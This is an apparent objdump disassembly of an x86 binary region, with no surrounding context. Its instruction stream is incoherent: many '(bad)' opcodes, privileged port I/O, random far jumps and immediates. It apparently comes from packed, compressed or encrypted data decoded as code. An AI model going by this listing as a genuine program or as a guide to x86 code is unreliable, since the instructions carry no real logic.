  41b641:	pop    ds
  41b642:	sbb    al,0xb0
  41b644:	and    eax,0x62d51418
  41b649:	xchg   BYTE PTR [esi-0x7b049b90],bl
  41b64f:	repnz retf 0x4608
  41b653:	retf   
  41b654:	int3   
  41b655:	and    ah,BYTE PTR [eax+eax*1-0x2f]
  41b659:	(bad)  
  41b65b:	in     eax,dx
  41b65c:	pop    edi
  41b65d:	pop    es
  41b65e:	lods   eax,DWORD PTR ds:[esi]
  41b65f:	sbb    ebx,eax
  41b661:	fcmovne st,st(5)
  41b663:	adc    eax,0x7326f5b4
  41b668:	pop    edx
  41b669:	mov    dh,0xb4
  41b66b:	xchg   ecx,eax
  41b66c:	aaa    
  41b66d:	ins    DWORD PTR es:[edi],dx
  41b66e:	push   ebp
  41b66f:	jl     0x41b66a
  41b671:	xor    DWORD PTR [ebp-0x4acc0460],edi
  41b677:	pop    eax
  41b678:	popf   
  41b679:	fdiv   QWORD PTR [edi]
  41b67b:	das    
  41b67c:	icebp  
  41b67d:	pop    ecx
  41b67e:	push   ss
  41b67f:	mov    edi,0x963813ba
  41b684:	push   ss
  41b685:	imul   esi,DWORD PTR [ebp+0x6308d530],0xa4cbeb83
  41b68f:	leave  
  41b690:	rol    BYTE PTR [eax],0x0
	...
  41b6f3:	add    BYTE PTR [eax-0x2469e49d],ch
  41b6f9:	(bad)  
  41b6fa:	lods   eax,DWORD PTR ds:[esi]
  41b6fb:	jg     0x41b6f8
  41b6fd:	push   ds
  41b6fe:	mov    ah,dh
  41b700:	jb     0x41b69c
  41b702:	jg     0x41b6bd
  41b704:	ins    BYTE PTR es:[edi],dx
  41b705:	and    eax,DWORD PTR [ecx]
  41b707:	add    BYTE PTR ds:0xb7000001,al
  41b70d:	mov    ebp,0xdc3a0296
  41b712:	retf   0x3b66
  41b715:	ret    
  41b716:	mov    ch,0x39
  41b718:	xchg   ebx,eax
  41b719:	aam    0xd9
  41b71b:	dec    esp
  41b71c:	or     dl,BYTE PTR [ebx-0x35e7b089]
  41b722:	es xor ebp,esi
  41b725:	lods   al,BYTE PTR ds:[esi]
  41b726:	cmovns ebx,DWORD PTR [ebx+0x0]
  41b72a:	outs   dx,DWORD PTR ds:[esi]
  41b72b:	mov    al,0x83
  41b72d:	(bad)  
  41b72e:	push   edi
  41b72f:	hlt    
  41b730:	pop    esp
  41b731:	cmp    al,0xf8
  41b733:	cmp    BYTE PTR [edx+0x5c88744b],dl
  41b739:	push   0x9f1078e5
  41b73e:	repz das 
  41b740:	retf   0x9d11
  41b743:	test   cl,dh
  41b745:	jmp    0xf4c5:0x55f5fbf4
  41b74c:	xor    eax,0x451bb17f
  41b751:	repnz sahf 
  41b753:	add    eax,0x61ee85f1
  41b758:	mov    ebp,0xfbdc18e1
  41b75d:	leave  
  41b75e:	cmp    al,0xd7
  41b760:	imul   ecx,DWORD PTR [edx-0x10],0x31a87e2d
  41b767:	sti    
  41b768:	jbe    0x41b734
  41b76a:	lods   eax,DWORD PTR ds:[esi]
  41b76b:	je     0x41b733
  41b76d:	and    ebp,DWORD PTR [esi]
  41b76f:	pop    edx
  41b770:	(bad)  [edx+0x56ccc67b]
  41b776:	xchg   ebx,eax
  41b777:	jp     0x41b731
  41b779:	add    ecx,DWORD PTR cs:[ebx+ebp*4-0x79]
  41b77e:	shl    DWORD PTR [ecx],1
  41b780:	xchg   BYTE PTR [ebp+0x6df4f0c0],dh
  41b786:	test   eax,0xc4923085
  41b78b:	dec    eax
  41b78c:	or     dl,bl
  41b78e:	pop    eax
  41b78f:	push   eax
  41b790:	gs xchg ebx,eax
  41b792:	inc    ebp
  41b793:	push   eax
  41b794:	xor    BYTE PTR [ecx],cl
  41b796:	mov    bl,0xed
  41b798:	and    al,BYTE PTR [eax+0x5bbce99]
  41b79e:	mov    edx,DWORD PTR [ebx+ecx*1-0x4c]
  41b7a2:	sbb    eax,0x68adeb55
  41b7a7:	ja     0x41b7d6
  41b7a9:	test   dl,ch
  41b7ab:	sub    al,0xd5
  41b7ad:	pop    eax
  41b7ae:	push   ebp
  41b7af:	arpl   WORD PTR [ebp-0x5d74a9bb],bp
  41b7b5:	lock hlt 
  41b7b7:	inc    ebp
  41b7b8:	mov    dh,0x69
  41b7ba:	je     0x41b767
  41b7bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b7bd:	cmp    eax,DWORD PTR [esi+ecx*2]
  41b7c0:	mov    ch,0x68
  41b7c2:	jge    0x41b83e
  41b7c4:	mov    al,ds:0xa4b68dcb
  41b7c9:	mov    al,ds:0x3213279f
  41b7ce:	repnz mov eax,ds:0xbe42ae3c
  41b7d4:	dec    eax
  41b7d5:	add    BYTE PTR [esp+edi*1-0x420a811c],0xba
  41b7dd:	cdq    
  41b7de:	addr16 jmp 0xc2a4:0x2a6223f7
  41b7e6:	mov    ah,0x70
  41b7e8:	xor    al,0x2
  41b7ea:	scas   eax,DWORD PTR es:[edi]
  41b7eb:	daa    
  41b7ec:	inc    edx
  41b7ed:	dec    edi
  41b7ee:	cmp    eax,0x4f33f5b8
  41b7f3:	icebp  
  41b7f4:	pop    ss
  41b7f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b7f6:	pop    ecx
  41b7f7:	add    BYTE PTR [ebx+0x3e],cl
  41b7fa:	shl    ebp,0xfe
  41b7fd:	dec    ecx
  41b7fe:	add    al,0x1b
  41b800:	mov    edx,0x67942e70
  41b805:	int3   
  41b806:	(bad)  
  41b807:	repnz outs dx,DWORD PTR ds:[esi]
  41b809:	mov    ?,WORD PTR ds:[ebp-0x860607a]
  41b810:	mov    al,0x0
	...
  41b872:	add    BYTE PTR [eax],al
  41b874:	mov    bh,ah
  41b876:	(bad)  
  41b877:	dec    esi
  41b878:	idiv   DWORD PTR [edi-0x75]
  41b87b:	cld    
  41b87c:	ret    0x78e3
  41b87f:	add    al,0x80
  41b881:	cmp    eax,0x247175d5
  41b886:	add    DWORD PTR [eax],eax
  41b888:	add    eax,0xa9000001
  41b88d:	fnstsw ax
  41b88f:	dec    edx
  41b890:	scas   al,BYTE PTR es:[edi]
  41b891:	stos   DWORD PTR es:[edi],eax
  41b892:	out    0x36,al
  41b894:	push   edx
  41b895:	mov    ebp,0x871b9a9b
  41b89a:	jl     0x41b8b8
  41b89c:	pop    edi
  41b89d:	loop   0x41b84b
  41b89f:	arpl   WORD PTR [edx],bp
  41b8a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b8a2:	aad    0x36
  41b8a4:	test   DWORD PTR [esi+edi*4+0x4c],0x3911c33c
  41b8ac:	in     al,0x3e
  41b8ae:	in     eax,0x82
  41b8b0:	sbb    eax,0xbb75f545
  41b8b5:	add    eax,DWORD PTR [edi]
  41b8b7:	(bad)  
  41b8b8:	into   
  41b8b9:	add    DWORD PTR ds:0xed9121a1,edx
  41b8bf:	xchg   edx,eax
  41b8c0:	ja     0x41b8ab
  41b8c2:	outs   dx,BYTE PTR ds:[esi]
  41b8c3:	out    dx,al
  41b8c4:	mov    esp,0x30c08c3c
  41b8c9:	outs   dx,DWORD PTR ds:[esi]
  41b8ca:	retf   
  41b8cb:	adc    ah,ch
  41b8cd:	jp     0x41b893
  41b8cf:	adc    ah,BYTE PTR [eax+0x2fb3f9b4]
  41b8d5:	push   ecx
  41b8d6:	cmp    BYTE PTR [ebp+0x6cee5ac8],ch
  41b8dc:	adc    ebp,DWORD PTR [ecx]
  41b8de:	adc    al,0x1b
  41b8e0:	push   eax
  41b8e1:	sbb    esi,DWORD PTR [esp+eiz*4-0x59]
  41b8e5:	sbb    BYTE PTR [ecx],bh
  41b8e7:	(bad)  
  41b8e8:	xor    ch,BYTE PTR [edi+edi*2-0x49688065]
  41b8ef:	dec    esi
  41b8f0:	pushf  
  41b8f1:	ret    0xd04
  41b8f4:	xchg   edi,eax
  41b8f5:	push   eax
  41b8f6:	xchg   esp,eax
  41b8f7:	pop    edi
  41b8f8:	mov    ah,0x83
  41b8fa:	push   0xffffff8f
  41b8fc:	push   ds
  41b8fd:	inc    edi
  41b8fe:	sub    ah,BYTE PTR [ebx-0x66]
  41b901:	push   edx
  41b902:	pusha  
  41b903:	push   ebp
  41b904:	mov    edi,0xf9580eba
  41b909:	cmc    
  41b90a:	jne    0x41b8b6
  41b90c:	jmp    0x41b988
  41b90e:	add    DWORD PTR ds:0xedfdc70f,esp
  41b914:	repnz int 0x50
  41b917:	mov    bl,0xd5
  41b919:	ins    DWORD PTR es:[edi],dx
  41b91a:	pop    DWORD PTR [esi]
  41b91c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b91d:	inc    ebp
  41b91e:	hlt    
  41b91f:	mov    bh,0x70
  41b921:	pushf  
  41b922:	int    0xa4
  41b924:	into   
  41b925:	xchg   edx,eax
  41b926:	out    dx,al
  41b927:	fsub   st,st(5)
  41b929:	pop    esi
  41b92a:	push   ss
  41b92b:	and    DWORD PTR [ecx-0x44],edx
  41b92e:	add    al,BYTE PTR [esi+0x593519cf]
  41b934:	mov    dh,0xf3
  41b936:	rol    esp,1
  41b938:	hlt    
  41b939:	ins    DWORD PTR es:[edi],dx
  41b93a:	mov    cl,0xbc
  41b93c:	into   
  41b93d:	mov    gs,edi
  41b93f:	rcl    BYTE PTR [edi+esi*1+0x67],cl
  41b943:	add    eax,0xf37a25a
  41b948:	imul   edi,DWORD PTR [esi+ecx*2+0x2c],0xae332b1d
  41b950:	jmp    DWORD PTR [edx-0x3ca65094]
  41b956:	in     eax,0x5
  41b958:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b959:	loopne 0x41b98e
  41b95b:	test   eax,0xc87789ec
  41b960:	jecxz  0x41b98e
  41b962:	in     al,0x12
  41b964:	out    0xc2,eax
  41b966:	mov    ch,0xc0
  41b968:	pusha  
  41b969:	(bad)  
  41b96a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b96b:	(bad)  
  41b96d:	jp     0x41b996
  41b96f:	push   es
  41b970:	out    dx,al
  41b971:	out    dx,al
  41b972:	cdq    
  41b973:	mov    BYTE PTR [esi],al
  41b975:	jbe    0x41b97c
  41b977:	xlat   BYTE PTR ds:[ebx]
  41b978:	pop    es
  41b979:	aas    
  41b97a:	add    ecx,DWORD PTR [ebx-0x41]
  41b97d:	nop
  41b97e:	inc    esi
  41b97f:	es adc ch,bl
  41b982:	in     eax,0x4a
  41b984:	test   DWORD PTR [ebx+0x3bd92fb7],edx
  41b98a:	out    dx,eax
  41b98b:	mov    DWORD PTR [edx+0x6dd34614],0x0
	...
  41b9f1:	add    BYTE PTR [eax],al
  41b9f3:	add    bl,al
  41b9f5:	mov    esp,0xf87f4844
  41b9fa:	iret   
  41b9fb:	mov    edi,0x8c8b3b8c
  41ba00:	hlt    
  41ba01:	in     eax,dx
  41ba02:	adc    eax,0x125763d
  41ba07:	add    BYTE PTR ds:0x78000001,al
  41ba0d:	jne    0x41ba1a
  41ba0f:	or     esi,DWORD PTR ds:0xac5939e1
  41ba15:	test   al,0x64
  41ba17:	clc    
  41ba18:	inc    ebx
  41ba19:	(bad)  
  41ba1b:	imul   edx,eax,0x14
  41ba1e:	sbb    cl,BYTE PTR [esi+esi*4-0x5d]
  41ba22:	outs   dx,DWORD PTR ds:[esi]
  41ba23:	pop    ebp
  41ba24:	ds je  0x41b9b6
  41ba27:	in     eax,0xce
  41ba29:	push   edi
  41ba2a:	fcmovne st,st(1)
  41ba2c:	arpl   dx,si
  41ba2e:	stc    
  41ba2f:	lods   al,BYTE PTR ds:[esi]
  41ba30:	ret    0x8c48
  41ba33:	adc    DWORD PTR [ebp-0x35],edx
  41ba36:	mov    esi,0x99888d2d
  41ba3b:	adc    DWORD PTR [edx-0x2f],esp
  41ba3e:	and    eax,0x7bf3af1c
  41ba43:	jecxz  0x41b9c5
  41ba45:	loopne 0x41ba0c
  41ba47:	(bad)
  41ba4b:	dec    ebp
  41ba4c:	inc    ebx
  41ba4d:	jg     0x41ba98
  41ba4f:	out    0x51,eax
  41ba51:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ba52:	(bad)  
  41ba56:	(bad)  
  41ba57:	repnz sub DWORD PTR [esp+ebp*8+0x1c0d6fa1],0x3437a4e5
  41ba63:	lods   eax,DWORD PTR ds:[esi]
  41ba64:	mov    dl,0x9a
  41ba66:	push   ss
  41ba67:	or     DWORD PTR [ebx+0x5d856718],edx
  41ba6d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ba6e:	mov    DWORD PTR [eax-0x3f8c68a0],edx
  41ba74:	add    dl,ah
  41ba76:	xlat   BYTE PTR ds:[ebx]
  41ba77:	add    ecx,DWORD PTR [esi]
  41ba79:	sub    BYTE PTR [ecx],ah
  41ba7b:	and    DWORD PTR [edi],ebp
  41ba7d:	cmp    ah,BYTE PTR [edx+0x15]
  41ba80:	out    dx,eax
  41ba81:	xchg   esp,eax
  41ba82:	mov    eax,ds:0xb12db55f
  41ba87:	out    0xf1,al
  41ba89:	dec    ebp
  41ba8a:	iret   
  41ba8b:	mov    edx,0x49b031df
  41ba90:	inc    ecx
  41ba91:	sahf   
  41ba92:	fnstenv ds:0x97a407
  41ba99:	cmpxchg BYTE PTR [eax+0x2d],dh
  41ba9d:	in     al,dx
  41ba9e:	mov    esp,0x7e50bbd5
  41baa3:	ja     0x41ba34
  41baa5:	jmp    0xcefbd8c6
  41baaa:	jg     0x41bb0c
  41baac:	into   
  41baad:	xchg   DWORD PTR [ebx],esp
  41baaf:	fisttp DWORD PTR [ebx]
  41bab1:	gs sub eax,0x68a743ad
  41bab7:	jbe    0x41ba49
  41bab9:	popf   
  41baba:	cli    
  41babb:	lock aam 0xea
  41babe:	xchg   ebx,esp
  41bac0:	cmp    edx,edi
  41bac2:	pop    ebx
  41bac3:	shr    DWORD PTR [edi],0x72
  41bac6:	aam    0x34
  41bac8:	call   0x3b40d51f
  41bacd:	mov    ecx,0x3c6e9284
  41bad2:	jno    0x41bb14
  41bad4:	imul   ebp,esi,0x72
  41bad7:	mov    dh,0xae
  41bad9:	sbb    cl,BYTE PTR ds:0xcfbbc0b9
  41badf:	jne    0x41bb26
  41bae1:	sub    eax,0x8638078b
  41bae6:	inc    ebp
  41bae7:	inc    ebx
  41bae8:	mov    ebx,0x929fafe5
  41baed:	stos   BYTE PTR es:[edi],al
  41baee:	lea    ebp,[edx+0x5a]
  41baf1:	pop    edi
  41baf2:	sub    BYTE PTR [eax+0x1f60af76],bl
  41baf8:	(bad)  [eax-0x5b]
  41bafb:	push   ebx
  41bafc:	fwait
  41bafd:	pop    ds
  41bafe:	add    bl,BYTE PTR [edi-0x6c7bd11c]
  41bb04:	imul   ecx,DWORD PTR [ecx-0x1a],0xffffff9c
  41bb08:	or     cl,ah
  41bb0a:	cmp    BYTE PTR [edx],bl
  41bb0c:	dec    eax
  41bb0d:	push   es
  41bb0e:	nop
  41bb0f:	scas   al,BYTE PTR es:[edi]
  41bb10:	pop    esi
	...
  41bb71:	add    BYTE PTR [eax],al
  41bb73:	add    BYTE PTR [edx],cl
  41bb75:	mov    eax,0xbfb7aaa5
  41bb7a:	(bad)  
  41bb7c:	jg     0x41bb83
  41bb7e:	arpl   WORD PTR [edi-0x27],cx
  41bb81:	sahf   
  41bb82:	mov    esi,0x1267b03
  41bb87:	add    BYTE PTR ds:0x9b000001,al
  41bb8d:	add    DWORD PTR ds:0xf040cdcc,ebp
  41bb93:	dec    ebp
  41bb94:	in     eax,0x20
  41bb96:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bb97:	mov    esi,0xd71c088d
  41bb9c:	xor    edi,esp
  41bb9e:	shr    BYTE PTR [ebp+0x446b926c],1
  41bba4:	and    eax,0x74eb788d
  41bba9:	sub    edi,DWORD PTR [edi+0x72645491]
  41bbaf:	stos   BYTE PTR es:[edi],al
  41bbb0:	xor    eax,DWORD PTR [edx-0x3a]
  41bbb3:	xlat   BYTE PTR ds:[ebx]
  41bbb4:	retf   
  41bbb5:	jg     0x41bbfa
  41bbb7:	test   eax,0xa61fd6ca
  41bbbc:	aaa    
  41bbbd:	ret    0x4ec
  41bbc0:	ja     0x41bb49
  41bbc2:	cmp    esp,ebx
  41bbc4:	stos   BYTE PTR es:[edi],al
  41bbc5:	retf   0x29e2
  41bbc8:	pop    edx
  41bbc9:	sub    al,BYTE PTR [edx+0x7bd840a]
  41bbcf:	inc    esi
  41bbd0:	xor    eax,0xc2d02427
  41bbd5:	and    dh,al
  41bbd7:	push   cs
  41bbd8:	inc    ebx
  41bbd9:	mov    bh,0x48
  41bbdb:	push   edx
  41bbdc:	les    ebx,FWORD PTR [esi-0x784950cc]
  41bbe2:	xor    cl,al
  41bbe4:	lds    esp,FWORD PTR [edi]
  41bbe6:	mov    esp,0xe1cd7d51
  41bbeb:	out    dx,al
  41bbec:	aam    0xbd
  41bbee:	out    dx,al
  41bbef:	jl     0x41bbb2
  41bbf1:	mov    cl,dh
  41bbf3:	enter  0x8fef,0x19
  41bbf7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bbf8:	retf   0x12d2
  41bbfb:	inc    edi
  41bbfc:	or     DWORD PTR [ebx+0x4ed9a490],eax
  41bc02:	sub    bl,BYTE PTR [ebx+ebx*8+0x7c]
  41bc06:	retf   0xf0fb
  41bc09:	je     0x41bb99
  41bc0b:	int    0x25
  41bc0d:	call   0xcc9afd9d
  41bc12:	pushf  
  41bc13:	ss pusha 
  41bc15:	out    0xa4,eax
  41bc17:	mov    eax,ds:0xe00fb876
  41bc1c:	dec    eax
  41bc1d:	mov    ds:0xf3aad586,al
  41bc22:	push   edx
  41bc23:	rcl    ch,1
  41bc25:	aam    0xbf
  41bc27:	dec    esi
  41bc28:	outs   dx,BYTE PTR ds:[esi]
  41bc29:	adc    eax,0xe90e1c74
  41bc2e:	pop    esp
  41bc2f:	xor    al,0x8d
  41bc31:	inc    ebp
  41bc32:	xchg   edx,eax
  41bc33:	or     ecx,ecx
  41bc35:	aaa    
  41bc36:	and    ecx,DWORD PTR [esi]
  41bc38:	outs   dx,DWORD PTR ds:[esi]
  41bc39:	dec    ecx
  41bc3a:	adc    eax,0x9180bfac
  41bc3f:	ja     0x41bc37
  41bc41:	cdq    
  41bc42:	(bad)  [ecx]
  41bc44:	mov    esp,?
  41bc46:	outs   dx,DWORD PTR ds:[esi]
  41bc47:	imul   eax,DWORD PTR [eax+0x18],0x6e7c1680
  41bc4e:	test   DWORD PTR [ebx+0x61913777],esi
  41bc54:	mov    ds:0x85cffe03,eax
  41bc59:	in     eax,dx
  41bc5a:	jb     0x41bc9c
  41bc5c:	retf   0xd54e
  41bc5f:	or     DWORD PTR [esi],edx
  41bc61:	jo     0x41bbe7
  41bc63:	mov    ds:0x4c086fb8,eax
  41bc68:	jg     0x41bcb7
  41bc6a:	pop    es
  41bc6b:	dec    ebx
  41bc6c:	test   DWORD PTR [edi],0x7b7fb882
  41bc72:	jl     0x41bcac
  41bc74:	mov    edx,0x37e4924b
  41bc79:	dec    esi
  41bc7a:	mov    ah,cl
  41bc7c:	dec    ecx
  41bc7d:	push   esp
  41bc7e:	nop
  41bc7f:	(bad)  
  41bc81:	xor    DWORD PTR [edi+0x32d72880],ebx
  41bc87:	or     DWORD PTR [esi],0x763bfc6e
  41bc8d:	dec    ebp
  41bc8e:	push   ecx
  41bc8f:	or     ebx,edx
	...
  41bcf1:	add    BYTE PTR [eax],al
  41bcf3:	add    dl,dl
  41bcf5:	xor    bh,dl
  41bcf7:	clc    
  41bcf8:	cli    
  41bcf9:	clc    
  41bcfa:	sar    BYTE PTR [edx],cl
  41bcfc:	sti    
  41bcfd:	mov    ebp,0x8ef6d9d8
  41bd02:	xor    al,0x3f
  41bd04:	and    BYTE PTR [edi],0x1
  41bd07:	add    BYTE PTR ds:0x6f000001,al
  41bd0d:	mov    bl,0xa6
  41bd0f:	and    BYTE PTR [eax+0x31271077],0xde
  41bd16:	dec    edi
  41bd17:	icebp  
  41bd18:	or     ebp,DWORD PTR [esi]
  41bd1a:	test   eax,0xb42d38ea
  41bd1f:	push   0x1e
  41bd21:	lea    ebx,[edx+0x2adf6fb5]
  41bd27:	in     eax,dx
  41bd28:	xor    al,0x37
  41bd2a:	fdiv   DWORD PTR [ecx+ecx*4]
  41bd2d:	xchg   ebx,eax
  41bd2e:	add    ah,ch
  41bd30:	or     al,0x83
  41bd32:	mov    BYTE PTR [ecx],ah
  41bd34:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bd35:	add    edi,DWORD PTR [ebx+0x1b040468]
  41bd3b:	dec    edx
  41bd3c:	retf   0x30eb
  41bd3f:	clc    
  41bd40:	ficomp WORD PTR [ebx-0x1b743d7f]
  41bd46:	jecxz  0x41bd18
  41bd48:	inc    ecx
  41bd49:	dec    ebp
  41bd4a:	int    0x3c
  41bd4c:	ins    BYTE PTR es:[edi],dx
  41bd4d:	rcr    BYTE PTR [esi+0x45d35d39],cl
  41bd53:	inc    ecx
  41bd54:	fcmovnu st,st(5)
  41bd56:	pusha  
  41bd57:	cwde   
  41bd58:	mov    ds:0x287a4011,eax
  41bd5d:	jns    0x41bd1e
  41bd5f:	mov    esi,0xfcfd77d2
  41bd64:	push   cs
  41bd65:	les    esp,FWORD PTR [eax+edx*8]
  41bd68:	out    dx,eax
  41bd69:	dec    edx
  41bd6a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bd6b:	fisub  WORD PTR [esi+ebx*2+0x53]
  41bd6f:	add    BYTE PTR [edx-0x42454b43],ch
  41bd75:	test   eax,0x9c9001a6
  41bd7a:	push   0x5f7dedd4
  41bd7f:	mov    ecx,0x6bf8bfa8
  41bd84:	popa   
  41bd85:	dec    ecx
  41bd86:	rdmsr  
  41bd88:	fistp  DWORD PTR [eax+0x194721bf]
  41bd8e:	or     bh,ch
  41bd90:	xchg   ecx,eax
  41bd91:	imul   ebp,DWORD PTR [edx-0x399b5b0],0x9e6e5fa2
  41bd9b:	lea    ecx,[edi+0x2e]
  41bd9e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bd9f:	std    
  41bda0:	xchg   edx,eax
  41bda1:	push   ebp
  41bda2:	jl     0x41bd72
  41bda4:	out    dx,al
  41bda5:	xor    cl,BYTE PTR [edi-0x13e11ac1]
  41bdab:	inc    edx
  41bdac:	dec    ecx
  41bdad:	pop    esp
  41bdae:	stc    
  41bdaf:	or     eax,0x657bf9bc
  41bdb4:	fchs   
  41bdb6:	sub    BYTE PTR [ecx+0x78],bl
  41bdb9:	lods   al,BYTE PTR ds:[esi]
  41bdba:	pushf  
  41bdbb:	hlt    
  41bdbc:	out    0x80,al
  41bdbe:	call   0xc36b:0x32f87c47
  41bdc5:	clc    
  41bdc6:	or     esi,DWORD PTR [edx]
  41bdc8:	(bad)  
  41bdc9:	fcom   QWORD PTR [ecx-0x72]
  41bdcc:	js     0x41bd52
  41bdce:	and    esi,DWORD PTR [edx]
  41bdd0:	inc    ebx
  41bdd1:	mov    dl,0xdb
  41bdd3:	mov    cl,0x3b
  41bdd5:	inc    ebp
  41bdd6:	(bad)  
  41bdd7:	push   esp
  41bdd8:	push   ss
  41bdd9:	rcr    DWORD PTR [ecx+ecx*4+0x45],cl
  41bddd:	lods   al,BYTE PTR ds:[esi]
  41bdde:	gs popa 
  41bde0:	in     al,0xac
  41bde2:	mov    esp,0x19a24f37
  41bde7:	jmp    0x16d7:0xb9cdde27
  41bdee:	push   ss
  41bdef:	aad    0x11
  41bdf1:	sbb    DWORD PTR ds:0x608734a3,ebp
  41bdf7:	ins    DWORD PTR es:[edi],dx
  41bdf8:	es jae 0x41bdc4
  41bdfb:	ss jl  0x41bda4
  41bdfe:	test   BYTE PTR [edi+0x12],0xf4
  41be02:	push   esi
  41be03:	dec    edi
  41be04:	dec    ebx
  41be05:	add    BYTE PTR [edi],dh
  41be07:	outs   dx,BYTE PTR ds:[esi]
  41be08:	inc    edx
  41be09:	enter  0x5cd7,0x2c
  41be0d:	pop    ebx
  41be0e:	xchg   edx,eax
  41be0f:	in     al,0xd3
	...
  41be71:	add    BYTE PTR [eax],al
  41be73:	add    BYTE PTR [ebp-0x63956373],al
  41be79:	jnp    0x41be72
  41be7b:	out    dx,eax
  41be7c:	mov    ebp,DWORD PTR [ecx-0x7123c09a]
  41be82:	xor    BYTE PTR [ebx],ah
  41be84:	test   DWORD PTR [eax],ebp
  41be86:	add    DWORD PTR [eax],eax
  41be88:	add    eax,0x62000001
  41be8d:	ja     0x41be62
  41be8f:	sbb    dl,BYTE PTR ds:[esi]
  41be92:	ror    BYTE PTR [edi],1
  41be94:	push   es
  41be95:	clc    
  41be96:	call   0x71a1e9b5
  41be9b:	dec    ebp
  41be9c:	pop    eax
  41be9d:	fidivr DWORD PTR [edi+edi*1]
  41bea0:	xchg   esi,eax
  41bea1:	pop    ecx
  41bea2:	stos   DWORD PTR es:[edi],eax
  41bea3:	fst    QWORD PTR [esi+0x47]
  41bea6:	jl     0x41bee4
  41bea8:	rcl    DWORD PTR [ecx],cl
  41beaa:	pop    ecx
  41beab:	es dec esi
  41bead:	outs   dx,DWORD PTR ds:[esi]
  41beae:	jo     0x41beb9
  41beb0:	cmc    
  41beb1:	adc    DWORD PTR [ebx-0x36],edx
  41beb4:	pop    esi
  41beb5:	loop   0x41bf07
  41beb7:	(bad)  
  41beb9:	mov    al,0xc5
  41bebb:	sbb    al,0x13
  41bebd:	ds icebp 
  41bebf:	xchg   ebx,eax
  41bec0:	xchg   DWORD PTR [edi+0x33],ebp
  41bec3:	jp     0x41be7e
  41bec5:	push   ebp
  41bec6:	push   ebp
  41bec7:	dec    eax
  41bec8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bec9:	hlt    
  41beca:	mov    bh,BYTE PTR [ecx+0x4e]
  41becd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bece:	mov    BYTE PTR [esi+0x78],dh
  41bed1:	pop    esp
  41bed2:	mov    esp,0x281a1212
  41bed7:	fwait
  41bed8:	jbe    0x41bf37
  41beda:	cs js  0x41be75
  41bedd:	sub    eax,0x79d882c0
  41bee2:	pop    esp
  41bee3:	xchg   DWORD PTR [eax+0x67],esp
  41bee6:	push   esi
  41bee7:	je     0x41bf05
  41bee9:	pushf  
  41beea:	sub    cl,BYTE PTR [eax-0x55]
  41beed:	fcomip st,st(1)
  41beef:	in     eax,0xe5
  41bef1:	adc    eax,0x1eadf649
  41bef6:	leave  
  41bef7:	jecxz  0x41bf2c
  41bef9:	es adc al,0x8e
  41befc:	in     al,dx
  41befd:	mov    bh,0xa
  41beff:	and    al,0x36
  41bf01:	fdivp  st(7),st
  41bf03:	outs   dx,DWORD PTR ds:[esi]
  41bf04:	ror    dl,1
  41bf06:	inc    esi
  41bf07:	jae    0x41bf57
  41bf09:	adc    al,0x38
  41bf0b:	aaa    
  41bf0c:	jle    0x41bf3e
  41bf0e:	fwait
  41bf0f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bf10:	dec    ebx
  41bf11:	in     eax,dx
  41bf12:	mov    ch,0x19
  41bf14:	push   esp
  41bf15:	(bad)  
  41bf16:	stc    
  41bf17:	dec    eax
  41bf18:	adc    al,BYTE PTR [edi-0x4ccd1de5]
  41bf1e:	enter  0xb7d7,0xb7
  41bf22:	and    cl,al
  41bf24:	repnz icebp 
  41bf26:	cdq    
  41bf27:	sbb    ecx,DWORD PTR [ebp-0x3e]
  41bf2a:	dec    sp
  41bf2c:	cmp    DWORD PTR [esi-0x32082018],edi
  41bf32:	push   esi
  41bf33:	(bad)  
  41bf34:	and    edx,DWORD PTR [ecx]
  41bf36:	xchg   edi,eax
  41bf37:	in     al,dx
  41bf38:	sbb    eax,eax
  41bf3a:	outs   dx,DWORD PTR ds:[esi]
  41bf3b:	ins    DWORD PTR es:[edi],dx
  41bf3c:	mov    bl,0x2a
  41bf3e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bf3f:	jae    0x41bf87
  41bf41:	push   0xffffffbd
  41bf43:	das    
  41bf44:	xor    BYTE PTR [ebx+0x62],al
  41bf47:	mov    eax,ds:0xe1245c9a
  41bf4c:	js     0x41bfcd
  41bf4e:	lods   al,BYTE PTR ds:[esi]
  41bf4f:	dec    ecx
  41bf50:	ss test ebp,0x9abe5bd5
  41bf57:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bf58:	test   BYTE PTR [edi-0x70],ch
  41bf5b:	add    eax,DWORD PTR [eax+0x6d]
  41bf5e:	pop    esi
  41bf5f:	fbld   TBYTE PTR [edx+0x3270e0a1]
  41bf65:	xlat   BYTE PTR ds:[ebx]
  41bf66:	sub    al,0x3f
  41bf68:	dec    esi
  41bf69:	aam    0x79
  41bf6b:	call   0x35e98468
  41bf70:	push   ebp
  41bf71:	inc    esi
  41bf72:	and    DWORD PTR [eax+0x33],ecx
  41bf75:	daa    
  41bf76:	sub    DWORD PTR [ecx-0x41],esp
  41bf79:	adc    edi,0x28
  41bf7c:	clc    
  41bf7d:	xor    edi,esp
  41bf7f:	imul   eax,edx,0x134e2ee9
  41bf85:	mov    edx,0x69c8ef67
  41bf8a:	rcl    DWORD PTR [esi],cl
  41bf8c:	mov    ch,0xc9
  41bf8e:	mov    ch,0x94
  41bf90:	inc    ecx
	...
  41bff1:	add    BYTE PTR [eax],al
  41bff3:	add    BYTE PTR [ebx+esi*2+0x33],ah
  41bff7:	es aaa 
  41bff9:	data16 jne 0x41c06f
  41bffc:	ins    BYTE PTR es:[edi],dx
  41bffd:	daa    
  41bffe:	mov    cl,0xc1
  41c000:	mov    ds:0x8aa6f3b1,eax
